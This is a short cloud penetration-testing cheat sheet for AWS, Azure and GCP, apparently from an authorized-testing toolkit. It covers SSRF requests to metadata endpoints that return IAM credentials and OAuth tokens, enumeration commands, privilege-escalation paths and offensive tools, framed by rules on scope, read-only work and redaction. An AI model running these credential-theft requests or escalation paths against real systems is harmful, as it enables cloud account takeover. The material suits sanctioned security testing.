# Cloud attack reference (AWS / Azure / GCP)
# Approval-gated. Read-only + benign proof. REDACT all creds/tokens in artifacts. In-scope accounts only.

## AWS
```
# Metadata (from an SSRF that reaches 169.254.169.254):
#   IMDSv1 (direct):  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
#   IMDSv2 (token):   PUT /latest/api/token  (header X-aws-ec2-metadata-token-ttl-seconds: 21600)
#                     then GET with header X-aws-ec2-metadata-token: <token>
# Identity (benign proof):  aws sts get-caller-identity
# Enumerate (read-only):    aws iam list-attached-role-policies ; aws s3 ls ; enumerate-iam
# Privesc paths: iam:PassRole+lambda/ec2, iam:CreatePolicyVersion, sts:AssumeRole chains, iam:PutUserPolicy
# Storage: public S3 (aws s3 ls s3://bucket --no-sign-request), bucket policy, pre-signed URL leaks
# Tools: pacu (modules), ScoutSuite/prowler (read-only audit), weirdAAL
```

## Azure
```
# IMDS managed identity (SSRF):
#   GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
#      (header: Metadata: true)  -> access_token for the managed identity
# Identity: az account show ; az ad signed-in-user show
# Enumerate: az role assignment list ; az resource list ; MicroBurst, ROADtools (AAD), Stormspotter
# Storage: public blob containers, SAS token leaks, storage account keys
# Privesc: over-scoped managed identity, Contributor->Owner, Automation Account runbooks, Key Vault access
```

## GCP
```
# Metadata (SSRF):
#   GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
#      (header: Metadata-Flavor: Google)  -> service-account OAuth token
# Identity: gcloud auth list ; gcloud config list ; token -> https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=
# Enumerate: gcloud projects list ; gcloud iam ... (read-only) ; GCPBucketBrute
# Storage: public GCS buckets ; Privesc: iam.serviceAccounts.actAs, setIamPolicy, deploymentmanager, cloudfunctions
```

## Cross-provider checklist
- SSRF → metadata is the #1 web→cloud pivot (hand from `ssrf-cloud`). Note IMDSv2 requires the token PUT —
  an SSRF that can't set headers/methods often can't reach IMDSv2 (report honestly).
- Benign proof = identity call + ONE marker read. Never dump data stores. Redact every token.
